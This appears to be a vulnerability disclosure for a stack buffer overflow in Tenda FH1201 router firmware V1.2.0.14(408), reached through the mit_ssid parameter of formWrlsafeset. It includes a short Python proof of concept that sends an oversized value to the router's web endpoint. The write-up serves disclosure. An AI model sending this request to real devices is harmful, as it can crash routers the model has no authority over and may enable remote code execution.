# Tenda FH1201 formWrlsafeset
### Overview
vendor: Tenda

product: FH1201

version: V1.2.0.14(408)

type: Stack Overflow
### Vulnerability Description
Tenda FH1201 V1.2.0.14(408) were discovered to contain a stack overflow via the mit_ssid parameter in the formWrlsafeset function.
### Vulnerability details
In function formWrlsafeset line 53, it reads in a user-provided parameter `mit_ssid`, and the variable `Var` is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `s_1`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/17.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/AdvSetWrlsafeset"

data = {
    "mit_ssid": "a" * 1000
}

response = requests.get(url, params=data)
print(response.text)
```

![](images/18.png)
